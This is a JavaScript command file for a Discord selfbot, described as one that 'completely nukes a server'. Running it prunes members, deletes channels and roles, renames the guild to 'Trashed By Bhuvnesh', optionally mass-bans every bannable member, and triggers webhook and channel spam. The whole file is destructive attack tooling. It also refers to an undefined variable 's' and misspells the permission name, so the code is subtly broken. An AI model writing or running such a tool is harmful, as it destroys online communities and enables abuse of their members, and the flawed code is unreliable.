const { default: axios } = require("axios");
const { Client, Message, MessageEmbed } = require("discord.js-selfbot");
const { send, massban: doMassBan } = require("../../Utility/functions");

module.exports = {
  name: "trash",
  description: "Completely Nukes a Server!",
  /**
   *
   * @param {Client} client
   * @param {Message} message
   * @param {String[]} args
   */
  run: async (client, message, args) => {
    try {
      const embed = new MessageEmbed().setColor(client.color).setFooter(`Made by ${client.owner.tag}`, client.owner.displayAvatarURL({ dynamic: !0 }));

      if (!s.guild.me.permissions.has("ADMINSTRATOR")) return await s.channel.send("Missing **`ADMINSTRATOR`** Permission!");

      let massban = false;

      if (message.content.includes("--massban") || message.content.includes("-m")) {
        massban = true;
      }

      await message.channel.send(`Trashing Server${massban ? " with Massban!" : "!"}`);

      // Prune
      await message.channel.send(`${client.prefix}prune`);

      // Delete Channels
      await message.channel.send(`${client.prefix}delchannels`);

      // new nuke channel
      const trasher = await message.guild.channels.create("trasher");

      // Name Change
      await message.guild.setName("Trashed By Bhuvnesh").catch(() => {});

      // Webhookspam / Massban
      if (massban) {
        const i = (await message.guild.members.fetch()).filter((e) => e.bannable);
        await doMassBan(client, i);
        await trasher.send(`Mass-Banning **${i.size}** Members`);
      } else {
        await trasher.send(`${client.prefix}webhookspam`);
      }

      // Delete Roles
      await trasher.send(`${client.prefix}delroles`);

      // Community Spam
      await trasher.send(`${client.prefix}channelfuckery`);
    } catch (e) {
      throw new Error(e);
    }
  },
};
